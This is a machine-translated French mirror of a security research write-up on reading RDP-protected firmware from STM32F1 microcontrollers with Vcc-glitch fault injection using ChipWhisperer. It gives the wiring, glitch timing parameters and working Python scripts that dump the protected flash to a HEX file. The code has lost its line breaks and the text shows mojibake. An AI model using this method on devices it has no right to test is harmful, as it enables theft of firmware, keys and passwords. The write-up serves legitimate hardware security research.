<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üê© üóúÔ∏è üßúüèª Lire le firmware s√©curis√© du flash STM32F1xx √† l'aide de ChipWhisperer üé∏ üòô üßìüèæ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Dans l' article pr√©c√©dent , nous avons trait√© des attaques Vcc-glitch √† l'aide de ChipWhisperer. Notre objectif suppl√©mentaire √©tait une √©tude progres...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Lire le firmware s√©curis√© du flash STM32F1xx √† l'aide de ChipWhisperer</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/ntc-vulkan/blog/483732/"><img src="https://habrastorage.org/webt/8h/fe/kf/8hfekfa930idilbg4asymru0cbm.png"><br><p>  Dans l' <a href="https://habr.com/ru/company/ntc-vulkan/blog/480500/">article</a> pr√©c√©dent <a href="https://habr.com/ru/company/ntc-vulkan/blog/480500/">,</a> nous avons trait√© des attaques Vcc-glitch √† l'aide de ChipWhisperer.  Notre objectif suppl√©mentaire √©tait une √©tude progressive du processus de lecture des microcontr√¥leurs √† microprogramme prot√©g√©s.  √Ä l'aide de telles attaques, un attaquant peut acc√©der √† tous les mots de passe des appareils et algorithmes logiciels.  Un exemple frappant est le <a href="https://www.youtube.com/watch%3Flist%3DPLhixgUqwRTjyLgF4x-ZLVFL-CRTCrUo03%255E_%255Eamp%255E_%255Etime_continue%3D3%255E_%255Eamp%255E_%255Ev%3DnNBktKw9Is4">piratage du</a> portefeuille cryptographique mat√©riel Ledger Nano S avec la carte MK STM32F042 utilisant des attaques Vcc-glitch. </p><br><p>  Int√©ressant?  Regardons sous le chat. </p><a name="habracut"></a><br><p>  Nous avons appris la possibilit√© de lire le firmware prot√©g√© √† partir d'un <a href="https://pdfs.semanticscholar.org/4c01/a7514deacc2c02d010bb14c4fb58d1712adc.pdf">article</a> qui montre les r√©sultats d'une attaque Vcc-glitch - contournant l'octet de protection RDP via un chargeur de d√©marrage pour plusieurs microcontr√¥leurs (ci-apr√®s - MK).  Nous vous recommandons √©galement de lire l' <a href="https://limitedresults.com/2019/11/pwn-the-esp32-forever-flash-encryption-and-sec-boot-keys-extraction/">article</a> sur la rupture de l'ESP32. </p><br><p>  La base th√©orique de l'√©tude √©tait la <a href="https://wiki.newae.com/Tutorial_A9_Bypassing_LPC1114_Read_Protect">ligne directrice pour la</a> lecture r√©ussie du microprogramme prot√©g√© pour LPC1114 via un chargeur de d√©marrage masqu√© utilisant ChipWhisperer. </p><br><p>  Comme dans le premier article, nous avons d√©cid√© de mener des exp√©riences sur la carte MK STM32F103RBT6: </p><br><img src="https://habrastorage.org/webt/nc/ul/rw/nculrwzmxjlbwnjkwqzs9wlpq3e.png"><br><p>  <em>Board STM32F103RBT6</em> </p><br><p>  La capacit√© d'√©crire des donn√©es dans les secteurs de la m√©moire flash et de la RAM ou de les lire, ainsi que d'effectuer d'autres actions avec la m√©moire MK est d√©termin√©e par la valeur de l'octet de protection (pour STM32 - RDP).  Pour diff√©rents MK, les valeurs et le but des octets de protection, ainsi que l'algorithme pour les v√©rifier, sont diff√©rents. </p><br><p>  <strong>Configuration mat√©rielle</strong> </p><br><p>  Commen√ßons l'exp√©rience.  Vous devez d'abord connecter ChipWhisperer √† MK selon la figure: </p><br><img src="https://habrastorage.org/webt/cw/fs/8s/cwfs8sdseto5gdlv8bcedgk9wzg.png"><br><p>  <em>Sch√©ma de connexion de ChipWhisperer √† STM32 pour lire le firmware prot√©g√© via un chargeur de masque</em> </p><br><p>  Les √©l√©ments √† retirer de la carte STM32F103RBT6 sont barr√©s dans le sch√©ma (contrairement √† la connexion MK standard).  Les fl√®ches indiquent les points de connexion de ChipWhisperer et les signatures indiquent ses broches. </p><br><p>  La pr√©sence de quartz externe, illustr√©e dans le diagramme, n'est pas n√©cessaire, car lorsque vous travaillez avec un chargeur de masque, le MK STM32F103RBT6 utilise une HORLOGE interne avec une fr√©quence de 24 MHz, il n'y a donc pas de synchronisation entre ChipWhisperer et MK. </p><br><p>  Passons √† la configuration de ChipWhisperer.  Comme indiqu√© ci-dessus, la fr√©quence recommand√©e de ChipWhisperer est de 24 MHz (ou un autre multiple).  Plus la multiplicit√© de cette fr√©quence est √©lev√©e, plus vous pouvez ajuster avec pr√©cision le moment de l'attaque.  En raison du manque de synchronisation, la s√©lection du param√®tre scope.glitch.offset est facultative; n'importe quelle valeur peut lui √™tre affect√©e. </p><br><p> Les param√®tres scope.glitch.repeat et scope.glitch.width doivent √™tre s√©lectionn√©s en fonction de la fr√©quence d√©finie de ChipWhisperer.  Avec une grande valeur de fr√©quence, toutes les impulsions √† court terme, dont le nombre est d√©fini √† l'aide de scope.glitch.repeat, fusionnent en une seule impulsion longue.  Par cons√©quent, vous pouvez s√©lectionner la valeur du param√®tre scope.glitch.width et scope.glitch.repeat √† corriger, ou vice versa.  Nous avons constat√© que la dur√©e d'impulsion optimale devrait √™tre d'environ 80 ns (d√©finie comme la largeur d'impulsion √† la moiti√© maximum). </p><br><p>  Reste √† s√©lectionner la valeur du param√®tre scope.glitch.ext_offset. </p><br><p>  <strong>S√©lection scope.glitch.ext_offset</strong> </p><br><p>  Vous devez d'abord choisir le moment de l'attaque.  Selon le sch√©ma pr√©sent√© dans le <a href="https://www.st.com/content/ccc/resource/technical/document/application_note/51/5f/03/1e/bd/9b/45/be/CD00264342.pdf/files/CD00264342.pdf/jcr:content/translations/en.CD00264342.pdf">document de</a> la soci√©t√© STM, la valeur d'octet de protection est v√©rifi√©e apr√®s r√©ception d'une demande de lecture des donn√©es du secteur flash: </p><br><img src="https://habrastorage.org/webt/m7/b-/ja/m7b-jat7np90pioveykbe8giw6y.jpeg"><br><p>  <em>L'algorithme de r√©ponse √† une demande de lecture de donn√©es du secteur flash</em> </p><br><p>  Pour v√©rifier la validit√© d'un tel sch√©ma de v√©rification, nous lisons le code ex√©cutable d'un chargeur comme MK sans protection RDP via ST-Link.  Les figures ci-dessous montrent des parties de l'algorithme de traitement des <strong>commandes de lecture de m√©moire</strong> . </p><br><img src="https://habrastorage.org/webt/tf/1k/uf/tf1kufh_t31hbeol-vhdxzooqba.png"><br><p>  <em>Vue g√©n√©rale du traitement d'une commande de lecture en m√©moire (l'appel √† la fonction de v√©rification RDP et l'envoi de NACK en cas d'√©chec de v√©rification sont clairement visibles)</em> </p><br><img src="https://habrastorage.org/webt/as/vk/3h/asvk3h81acmw7vjx75he0tcimga.jpeg"><br><p>  <em>Corps de la fonction de validation RDP</em> </p><br><p> Prenons attention au corps de la fonction de v√©rification RDP: on peut voir que le registre est lu √† <code>0x40022000 + 0x1C</code> , un d√©calage logique de 30 bits et une ramification.  √Ä partir de la documentation du <a href="https://www.st.com/content/ccc/resource/technical/document/programming_manual/10/98/e8/d4/2b/51/4b/f5/CD00283419.pdf/files/CD00283419.pdf/jcr:content/translations/en.CD00283419.pdf">manuel de programmation PM0075 (microcontr√¥leurs de m√©moire flash STM32F10xxx),</a> il <code>0x40022000</code> clairement que <code>0x40022000</code> est l'adresse de base du contr√¥leur de m√©moire flash et <code>0x1C</code> est le <strong>d√©calage de</strong> registre <strong>FLASH_OBR</strong> , dans lequel nous sommes int√©ress√©s par le deuxi√®me bit de <strong>RDPRT</strong> : Protection en lecture, qui contient le statut de protection RDP. </p><br><p>  Le moment n√©cessaire de l'attaque est le d√©veloppement de l'instruction <code>LDR</code> (chargement depuis la m√©moire).  Cette instruction se situe entre la demande de lecture du firmware (envoi d'un octet <code>0x11</code> avec une <code>0xEE</code> ) et la r√©ponse <code>ACK</code> / <code>NOACK</code> MK par UART.  Afin de fixer visuellement ce moment, il est n√©cessaire de connecter l'oscilloscope √† UART1_RX (broche PA10) et UART1_TX (broche PA9), puis de surveiller le changement de tension selon UART1.  Par cons√©quent, la forme d'onde d'attaque de puissance avec la valeur scope.glitch.ext_offset s√©lectionn√©e devrait ressembler √† ceci: </p><br><img src="https://habrastorage.org/webt/fz/dm/j5/fzdmj5iyu5zfmcvmbqx0hf2mqms.jpeg"><br><p>  <em>Choisir le moment de l'attaque</em> </p><br><p>  <strong>Script de lecture du firmware</strong> </p><br><p>  Vous devez maintenant sp√©cifier le moment de d√©clenchement du d√©clencheur CW_TRIG en code Python afin d'intercepter le moment de la transmission de la somme de contr√¥le via UART1_RX.  ChipWhisperer poss√®de une biblioth√®que pour communiquer avec le maskloader STM32 MK.  En mode normal, cette biblioth√®que est utilis√©e pour t√©l√©charger le micrologiciel des manuels vers le MK √† l'aide de la classe de <code>class STM32FSerial(object)</code> situ√©e dans le fichier <code>programmer_stm32fserial.py</code> le long du chemin <code>software/chipwhisperer/hardware/naeusb/</code> .  Pour activer le d√©clencheur, vous devez copier cette classe dans le script ex√©cutable principal afin que la m√©thode de classe <code>CmdGeneric(self, cmd)</code> devienne accessible globalement, et ajoutez la commande <code>scope.arm()</code> avant d'envoyer la somme de contr√¥le (0xEE) de la demande de lecture du secteur m√©moire.  La classe finale est donn√©e dans le spoiler ci-dessous. </p><br><div class="spoiler">  <b class="spoiler_title">Classe pour communiquer ChipWhisperer avec STM32</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> time <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> sys <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> logging <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> chipwhisperer.common.utils <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> util <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> chipwhisperer.hardware.naeusb.programmer_stm32fserial <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> supported_stm32f <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> chipwhisperer.capture.api.programmers <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> Programmer <span class="hljs-comment"><span class="hljs-comment"># class which can normally using internal CW library for reading STM32 firmware by UART class STM32Reader(Programmer): def __init__(self): super(STM32Reader, self).__init__() self.supported_chips = supported_stm32f self.slow_speed = False self.small_blocks = True self.stm = None def stm32prog(self): if self.stm is None: stm = self.scope.scopetype.dev.serialstm32f else: stm = self.stm stm.slow_speed = self.slow_speed stm.small_blocks = self.small_blocks return stm def stm32open(self): stm32f = self.stm32prog() stm32f.open_port() def stm32find(self): stm32f = self.stm32prog() stm32f.scope = self.scope sig, chip = stm32f.find() def stm32readMem(self, addr, lng): stm32f = self.stm32prog() stm32f.scope = self.scope #answer = stm32f.readMemory(addr, lng) answer = self.ReadMemory(addr, lng) return answer def stm32GetID(self): stm32f = self.stm32prog() stm32f.scope = self.scope answer = stm32f.cmdGetID() return answer # Needed for connection to STM after reload by reset_target(scope) method def FindSTM(self): #setup serial port (or CW-serial port?) stm32f = self.stm32prog() try: stm32f.initChip() except IOError: print("Failed to detect chip. Check following: ") print(" 1. Connections and device power. ") print(" 2. Device has valid clock (or remove clock entirely for internal osc).") print(" 3. On Rev -02 CW308T-STM32Fx boards, BOOT0 is routed to PDIC.") raise boot_version = stm32f.cmdGet() chip_id = stm32f.cmdGetID() for t in supported_stm32f: if chip_id == t.signature: # print("Detected known STMF32: %s" % t.name) stm32f.setChip(t) return chip_id, t # print("Detected unknown STM32F ID: 0x%03x" % chip_id) return chip_id, None</span></span></code> </pre> </div></div><br><p>  Il convient de noter que le chargeur de masques STM32F1xx vous permet de lire pas plus de 256 octets de micrologiciel √† partir d'un secteur flash sp√©cifi√© en une seule demande.  Par cons√©quent, lors de la lecture de l'int√©gralit√© du firmware du MK, il est n√©cessaire d'effectuer plusieurs requ√™tes de lecture lors de l'attaque Vcc-glitch.  Ensuite, les 256 octets re√ßus doivent √™tre divis√©s en huit tableaux de 32 octets et former un fichier HEX √† partir d'eux. </p><br><div class="spoiler">  <b class="spoiler_title">Code du convertisseur HEX et fonctions auxiliaires</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">int2str_0xFF</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(int_number, number_of_bytes)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">'{0:0{1}X}'</span></span>.format(int_number,number_of_bytes_in_string) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">data_dividing_from_256_to_32_bytes</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(data_to_divide, mem_sector, mem_step=</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">32</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> mem_sector &gt; <span class="hljs-number"><span class="hljs-number">0xFFFF</span></span>: mem_conversion = mem_sector &gt;&gt; <span class="hljs-number"><span class="hljs-number">16</span></span> mem_conversion = mem_sector - (mem_conversion &lt;&lt; <span class="hljs-number"><span class="hljs-number">16</span></span>) data_out = <span class="hljs-string"><span class="hljs-string">''</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(int(<span class="hljs-number"><span class="hljs-number">256</span></span>/mem_step)): data_vector = data_to_divide[(i * mem_step):((i + <span class="hljs-number"><span class="hljs-number">1</span></span>) * mem_step)] mem_calc = mem_conversion + (i * mem_step) data_out += read_and_convert_data_hex_file(data_vector, mem_calc, mem_step) + <span class="hljs-string"><span class="hljs-string">'\n'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> data_out <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">read_and_convert_data_hex_file</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(data_to_convert, memory_address, mem_step)</span></span></span><span class="hljs-function">:</span></span> addr_string = memory_address -((memory_address &gt;&gt; <span class="hljs-number"><span class="hljs-number">20</span></span>) &lt;&lt; <span class="hljs-number"><span class="hljs-number">20</span></span>) data_buffer = <span class="hljs-string"><span class="hljs-string">''</span></span> crcacc = <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> x <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, len(data_to_convert)): data_buffer += int2str_0xFF(data_to_convert[x], <span class="hljs-number"><span class="hljs-number">2</span></span>) crcacc += data_to_convert[x] crcacc += mem_step temp_addr_string = addr_string <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range (<span class="hljs-number"><span class="hljs-number">4</span></span>, <span class="hljs-number"><span class="hljs-number">-1</span></span>, <span class="hljs-number"><span class="hljs-number">-2</span></span>): crcacc += temp_addr_string &gt;&gt; i*<span class="hljs-number"><span class="hljs-number">4</span></span> temp_addr_string -= ((temp_addr_string &gt;&gt; i*<span class="hljs-number"><span class="hljs-number">4</span></span>) &lt;&lt; i*<span class="hljs-number"><span class="hljs-number">4</span></span>) crcacc_2nd_symbol = (crcacc &gt;&gt; <span class="hljs-number"><span class="hljs-number">8</span></span>) + <span class="hljs-number"><span class="hljs-number">1</span></span> crcacc = (crcacc_2nd_symbol &lt;&lt; <span class="hljs-number"><span class="hljs-number">8</span></span>) - crcacc <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> crcacc == <span class="hljs-number"><span class="hljs-number">0x100</span></span>: crcacc = <span class="hljs-number"><span class="hljs-number">0</span></span> RECTYP = <span class="hljs-number"><span class="hljs-number">0x00</span></span> out_string = <span class="hljs-string"><span class="hljs-string">':'</span></span>+ Int_To_Hex_String(mem_step, <span class="hljs-number"><span class="hljs-number">2</span></span>) +\ Int_To_Hex_String((addr_string),<span class="hljs-number"><span class="hljs-number">4</span></span>) +\ Int_To_Hex_String(RECTYP, <span class="hljs-number"><span class="hljs-number">2</span></span>) +\ data_buffer +\ Int_To_Hex_String(crcacc, <span class="hljs-number"><span class="hljs-number">2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> out_string <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">send_to_file</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(info_to_output, File_name, directory)</span></span></span><span class="hljs-function">:</span></span> file = open(directory + File_name + <span class="hljs-string"><span class="hljs-string">'.hex'</span></span>, <span class="hljs-string"><span class="hljs-string">'w'</span></span>) file.write(info_to_output) file.close() <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">reset_target</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(scope)</span></span></span><span class="hljs-function">:</span></span> scope.io.nrst = <span class="hljs-string"><span class="hljs-string">'low'</span></span> time.sleep(<span class="hljs-number"><span class="hljs-number">0.05</span></span>) scope.io.nrst = <span class="hljs-string"><span class="hljs-string">'high'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> collections <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> namedtuple Range = namedtuple(<span class="hljs-string"><span class="hljs-string">'Range'</span></span>, [<span class="hljs-string"><span class="hljs-string">'min'</span></span>, <span class="hljs-string"><span class="hljs-string">'max'</span></span>, <span class="hljs-string"><span class="hljs-string">'step'</span></span>])</code> </pre></div></div><br><p>  La configuration des param√®tres de ChipWhisperer est maintenant termin√©e.  Le script final pour lire le firmware est le suivant: </p><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment"># string of start HEX file Start_of_File_Record = ':020000040800F2' # string of end HEX file End_of_File_Record = ':00000001FF' length_of_sector = 256 if length_of_sector % 4 != 0: sys.exit('length_of_sector must be equal to 4') output_to_file_buffer = '' output_to_file_buffer += Start_of_File_Record + '\n' mem_current = mem_start while mem_current &lt; mem_stop: # flush the garbage from the computer's target read buffer target.ser.flush() # run aux stuff that should run before the scope arms here reset_target(scope) # initialize STM32 after each reset prog.FindSTM() try: # reading of closed memory sector data = prog.stm32readMem(mem_current, length_of_sector) except Exception as message: message = str(message) if "Can't read port" in message: # print('Port silence') pass elif 'Unknown response. 0x11: 0x0' in message: # print('Crashed. Reload!') pass elif 'NACK 0x11' in message: # print('Firmware is closed!') pass else: # print('Unknown error:', message, scope.glitch.offset, scope.glitch.width, scope.glitch.ext_offset) pass else: data_to_out = data_dividing_from_256_to_32_bytes (data, mem_current) print(data_to_out) output_to_file_buffer += data_to_out mem_current += length_of_sector output_to_file_buffer += End_of_File_Record + '\n' send_to_file(output_to_file_buffer, File_name, directory)</span></span></code> </pre> <br><p>  Tous les messages <code>print()</code> ont √©t√© mis en commentaire apr√®s la ligne, <code>except Exception as</code> aide √† surveiller l'√©tat du MC lors de la recherche des param√®tres optimaux pour l'impulsion de p√©pin.  Pour suivre l'√©tat sp√©cifique de MK, il suffit de d√©commenter le message <code>print()</code> n√©cessaire. </p><br><p>  <strong>R√©sultats de lecture</strong> </p><br><p>  La vid√©o montre le t√©l√©chargement du firmware sur le MK via le programmateur ST-LINK, le transfert de RDP √† l'√©tat de protection puis la lecture du firmware: </p><br><iframe width="560" height="315" src="https://www.youtube.com/embed/CRfg9-1BV0k" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><p>  Les erreurs suivantes peuvent emp√™cher des attaques Vcc-glitch r√©ussies: </p><br><p>  ‚Ä¢ lire le mauvais secteur de la m√©moire; </p><br><p>  ‚Ä¢ suppression spontan√©e du firmware. </p><br><p>  Une s√©lection pr√©cise du moment de l'attaque en augmentant la fr√©quence de ChipWhisperer aidera √† √©viter de telles erreurs. </p><br><p>  Apr√®s avoir d√©velopp√© et d√©bogu√© l'algorithme de lecture du firmware prot√©g√©, nous avons effectu√© une lecture test du firmware du programmateur ST-LINK-V2.1, qui fonctionne sur le STM32F103CBT6 MK.  Quelques firmware, nous avons cousu un MK STM32F103CBT6 "propre" et l'avons install√© √† la place de celui d'origine.  En cons√©quence, ST-LINK-V2.1 avec le MK remplac√© a fonctionn√© en mode normal, comme s'il n'y avait pas de substitution. </p><br><p>  Nous avons √©galement tent√© de mener une s√©rie d'attaques contre STM32F303RCT7.  Ce MK pendant l'attaque s'est comport√© de mani√®re identique √† STM32F103RBT6, mais la r√©ponse √† la demande de m√©moire de lecture contenait un octet √©gal √† 0x00, ce qui ne co√Øncidait pas avec le r√©sultat attendu.  La raison de cet √©chec √©tait un principe plus complexe et d√©velopp√© d'organiser la protection de ces MK. </p><br><p>  Il existe deux √©tats de protection dans le STM32F1xx MK: la protection est d√©sactiv√©e (niveau 0) et activ√©e (niveau 1).  Dans les mod√®les plus anciens, il existe trois √©tats de protection: la protection est d√©sactiv√©e (niveau 0, RDP = 0x55AA), la protection de la m√©moire flash et SRAM (niveau 2, RDP = 0x33CC) et la protection de la m√©moire flash uniquement (niveau 1, RDP prend toutes les valeurs autres que de 0x55AA et 0x33CC).  √âtant donn√© que le niveau 1 peut prendre de nombreuses valeurs RDP, le r√©glage du niveau 0 est assez difficile.  D'autre part, il est possible de baisser le niveau de protection du niveau 2 au niveau 1 en renversant un bit dans l'octet RDP (illustr√© dans la figure ci-dessous), ce qui permet d'acc√©der √† la m√©moire SRAM. </p><br><img src="https://habrastorage.org/webt/dj/by/ef/djbyefc1yji_gpevygy72yzvtjm.jpeg"><br><p>  <em>Comparaison des valeurs RDP pour diff√©rents niveaux de protection du firmware</em> </p><br><p>  Il ne reste plus qu'√† comprendre comment un attaquant peut en profiter.  Par exemple, √† l'aide de la m√©thode CBS (Cold-Boot Stepping) d√©crite dans <a href="https://www.usenix.org/system/files/conference/woot17/woot17-paper-obermaier.pdf">cet article</a> .  Cette m√©thode est bas√©e sur un instantan√© progressif de l'√©tat de la m√©moire SRAM (la fr√©quence de chaque instantan√© √©tait en microsecondes) apr√®s le chargement du MC afin d'obtenir des cl√©s de chiffrement, des mots de passe cach√©s ou toute autre information pr√©cieuse.  Les auteurs sugg√®rent que la m√©thode CBS fonctionnera sur toutes les s√©ries STM32 MK. </p><br><p>  <strong>Conclusions</strong> </p><br><p>  Pour r√©sumer nos exp√©riences.  Il nous a fallu plusieurs jours pour terminer une attaque de p√©pin Vcc en utilisant les donn√©es obtenues d'une √©tude pr√©c√©dente (qui peut √™tre lue <a href="https://habr.com/ru/company/ntc-vulkan/blog/480500/">ici</a> ).  Ainsi, apprendre √† mener de telles attaques est assez facile. </p><br><p>  Les attaques Vcc-glitch sont dangereuses car elles sont difficiles √† d√©fendre.  Pour r√©duire la probabilit√© de mener √† bien de telles attaques, il est propos√© d'utiliser MK avec un niveau de protection plus √©lev√©. </p><br><p> <a href="https://raccoonsecurity.ru/"><img src="https://habrastorage.org/webt/6d/ts/lv/6dtslv2uikkshhl7tmsi7fgjp0y.png"></a> </p><br><p>  Raccoon Security est une √©quipe sp√©ciale d'experts du Centre scientifique et technique Volcano dans le domaine de la s√©curit√© des informations pratiques, de la cryptographie, des circuits, de la r√©tro-ing√©nierie et de la cr√©ation de logiciels de bas niveau. </p><br></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr483732/">https://habr.com/ru/post/fr483732/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr483720/index.html">Ce qui nous a apport√© Pandas 1.0</a></li>
<li><a href="../fr483722/index.html">G√©oanalytique dans le commerce de d√©tail, partie 1: nous automatisons le processus de choix d'un lieu pour une entreprise. 2GIS + MS Azure + ML</a></li>
<li><a href="../fr483724/index.html">Travailler avec des pneus personnalis√©s complexes Redd</a></li>
<li><a href="../fr483726/index.html">JavaScript et HTML vanille. Aucun cadre. Pas de biblioth√®ques. Pas de probl√®me</a></li>
<li><a href="../fr483730/index.html">Programmers Union 2: les pantoufles ont cess√© de rire et sont devenues r√©fl√©chies</a></li>
<li><a href="../fr483734/index.html">Quel prix payons-nous pour utiliser async / attendre dans JS / C # / Rust</a></li>
<li><a href="../fr483736/index.html">Recherche d'image invers√©e: un guide de l'agence de d√©tective Bellingcat</a></li>
<li><a href="../fr483740/index.html">Configuration du routage dynamique (en particulier BGP) sur le tunnel OpenVPN sous Linux (et probablement * BSD)</a></li>
<li><a href="../fr483742/index.html">Rechercher des bugs comme mode de vie</a></li>
<li><a href="../fr483744/index.html">Vente du Nouvel An</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>